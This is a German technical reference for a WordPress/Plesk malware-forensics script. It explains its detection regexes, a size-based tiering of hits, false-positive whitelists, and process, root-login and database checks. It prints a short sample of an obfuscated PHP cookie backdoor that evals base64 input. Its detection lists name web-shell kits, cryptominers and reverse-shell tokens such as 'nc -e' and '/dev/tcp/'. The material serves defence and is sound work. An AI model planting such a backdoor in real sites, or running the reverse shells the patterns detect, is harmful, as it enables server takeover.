# NT-Forensik — Erkennungs-Referenz

Technische Details, wie `wp_plesk_forensik.sh` Schadcode erkennt, und warum die Heuristiken so gewählt sind. Für Techniker, die Funde bewerten oder die Erkennung anpassen wollen.

> Alle Beispiele sind fiktiv/generisch.

---

## 1. Obfuskierte Cookie-Backdoors

Die schwierigste Klasse — und der Grund für dieses Tool. Eine typische Datei (190–280 Byte):

```php
<?php $x='C'; $m='_'; $s='OOKIE'; $c=${$m.$x.$s};
if(isset($c['a1B2c3'])){ EvaL(base64_decode($c['a1B2c3'])); }
```

Warum Standardscanner das übersehen:

| Evasion | Wirkung | Gegenmaßnahme im Tool |
|---|---|---|
| **Variable-Variable-Superglobal** `${$m.$x.$s}` | `$_COOKIE` steht nirgends wörtlich im Code | Regex auf `\$\{\s*\$var(\s*\.\s*\$var)+\s*\}` |
| **Mixed-case** `EvaL`, `evAl`, `EVaL` | umgeht `eval(`-Signaturen | Suche case-insensitive (`grep -iP`) |
| **Payload im Cookie** | taucht nicht in URL/Access-Logs auf | Datei-Inhalts-Scan statt Log-Scan |
| **Harmlose Namen** `social-icon.php` | Namensfilter greift nicht | Inhalts-Signatur, nicht Dateiname |

### Die Detektions-Signatur

Kern-Regex (vereinfacht), case-insensitive über alle `*.php`:

```
${$a.$b…}                                  # Variable-Variable-Superglobal
| eval\s*\(\s*(base64_decode|gzinflate|gzuncompress|str_rot13)
| eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)
| assert\s*\(\s*\$_
| create_function\s*\(\s*'…'\s*,\s*\$      # Dropper-Form
| preg_replace\s*\(\s*'…/e…'              # /e-Modifier (RCE)
| FilesMan | c99sh | r57shell | b374k      # bekannte Shell-Kits
```

`move_uploaded_file($_FILES)` ist **bewusst kein** Muster — es matcht jeden legitimen Upload-Handler.

## 2. Zweistufige Bewertung (Größenschwelle)

Das Problem: `eval(base64_decode(...))` und Variable-Variablen kommen auch in **legitimen** Frameworks vor (z. B. Krypto-Bibliotheken, alte Template-Engines). Die Unterscheidung gelingt über die **Dateigröße**:

| Tier | Bedingung | Einstufung |
|---|---|---|
| **Dropper** | Signatur **und** Datei < 3000 Byte | 🔴 kritisch |
| **Review** | Signatur, aber Datei ≥ 3000 Byte | ⚠️ manuell prüfen |

**Begründung:** Ein Dropper ist fast nur Obfuskation → winzig. Legitimer `eval`-Code steckt eingebettet in großen Dateien (viel Drumherum). In der Praxis trennt das die echten Backdoors (200–300 B) sauber von Framework-Fundstellen (10–50 kB).

Beide Tiers landen im Bericht (mit Größe, mtime, SHA256, Treffer-Vorschau), aber nur Tier 1 ist kritisch. Der Dropper-Cluster wird nach Domain gruppiert, damit die betroffene Site sofort sichtbar ist.

## 3. False-Positive-Filter

Ohne Filter erzeugt Forensik auf gewachsenen Servern viel Rauschen. Bewusst herausgefiltert:

| Fund | Warum gutartig | Filter |
|---|---|---|
| `uploads/**/index.php` (27 B, „Silence is golden") | WP-/Plugin-Guard gegen Directory-Listing | Größe < 200 B + Inhaltsmuster |
| `avia_fonts/*charmap.php`, `avia_icon_fonts/*` | Enfold-Theme-Iconfont-Maps | Pfad-Whitelist |
| `borlabs-cookie/*`, `backwpup/*/index.php` | Plugin-Guards | Pfad-Whitelist |
| WP-`ABSPATH`-geschützte Config-PHP | Standard-WP-Konvention | `ABSPATH` in ersten 120 B + < 2 kB |
| `python3.10 (deleted)` als Prozess-exe | apt-Upgrade-Rest, kein Rootkit | Ziel auf `/usr/bin`, `/lib`, … = gutartig |
| `plesk-ssh-terminal`-Keys bei Web-Usern | Plesk-Browser-Terminal | Key-Kommentar-Whitelist |
| Plugin-Klassen wie `class.u.shell.php`, `*-bypass.php` | legitime Plugin-Dateinamen | Dateinamen-Check nur als ⚠️, Core/vendor/cache ausgeschlossen |

**Grundsatz:** Lieber gezielt whitelisten als Signaturen aufweichen — die Erkennung bleibt scharf, das Rauschen sinkt.

## 4. Prozess-Forensik (§8.2)

| Prüfung | Kritisch, wenn |
|---|---|
| Miner-Namen | `xmrig`, `kinsing`, `kdevtmpfsi`, `stratum+tcp`, … im Prozess |
| Gelöschtes Binary | `/proc/*/exe → (deleted)` **und** Ziel **nicht** auf Systempfad (`/usr`, `/lib`, `/opt/plesk`, …) |
| Herkunft | exe läuft aus `/tmp`, `/var/tmp`, `/dev/shm` oder Webspace |
| Reverse-Shell | `bash -i`, `nc -e`, `/dev/tcp/`, socket-One-Liner in der Kommandozeile |

Der Systempfad-Filter beim gelöschten Binary ist entscheidend: Nach jedem `apt upgrade` laufen Alt-Prozesse legitim mit `(deleted)` weiter — nur ein gelöschtes Binary auf ungewöhnlichem Pfad ist ein Malware-Indikator.

## 5. Root-Verdikt (§12)

Konsolidiert mehrere Signale zu einer Aussage. Flags, die ein 🔴 auslösen:

- Bekannte **Web-Angreifer-IP** taucht unter erfolgreichen **Root-Logins** auf.
- **Fremde SSH-Keys** (nicht Plesk-Terminal, nicht Admin) bei Root oder Web-Usern.
- **sudo/su-Eskalation** durch Web-/Systemnutzer in den Auth-Logs.
- **Manipulierte System-Binaries** (`dpkg -V` meldet MD5-Mismatch bei bash/ssh/curl/cron).

Null Flags → 🟢 „auf Web-User-Ebene begrenzt". Das ist der forensisch wertvolle Kern: Er trennt einen **Website-Einbruch** (eine Domain neu aufsetzen) von einer **Server-Übernahme** (alles neu).

Zusätzlich als ⚠️ (kein Flag, aber Härtungshinweis): Root-Login per Passwort aktiv, `authorized_keys` kürzlich geändert.

## 6. WordPress-DB-Prüfung (§11)

Read-only-SELECTs gegen jede gefundene WP-DB (Zugang aus `wp-config.php`, bevorzugt Plesk-Admin-MySQL):

| Prüfung | 🔴-Kriterium |
|---|---|
| Admin-Konten | Auflistung; **kürzlich registrierte** Admins (< 30 Tage) = kritisch |
| Optionen | `option_value` mit `base64_decode`/`eval(` oder `auto_prepend`/`auto_append` |
| `siteurl`/`home` | Abweichung vom Domainnamen (Hinweis, Redirect-Hijack) |
| aktive Plugins | Datei-Manager (`fileorganizer`, `wp-file-manager`) = ⚠️ Vektor |

Ein heimlich angelegtes Admin-Konto ist die häufigste WordPress-Persistenz — es überlebt jede Datei-Bereinigung.

## 7. Grenzen

- **Keine Garantie auf Vollständigkeit.** Neue Obfuskationsvarianten können der Signatur entgehen.
- **Log-Reichweite** begrenzt die Zeitachse — sehr alte Erstinfektionen liegen evtl. außerhalb der rotierten Logs (Datei-Zeitstempel helfen).
- **Verschlüsselte/gestagte Payloads**, die erst zur Laufzeit nachladen, sind statisch schwer zu fassen.
- Der Dateinamen-Check (§7.5) ist bewusst nur eine ⚠️ — er ist namensbasiert und rauschanfällig.

Deshalb gilt: Das Tool **beschleunigt und dokumentiert** die Forensik, ersetzt aber nicht das geschulte Auge bei der Bewertung.

---
*netztaucher | digital*
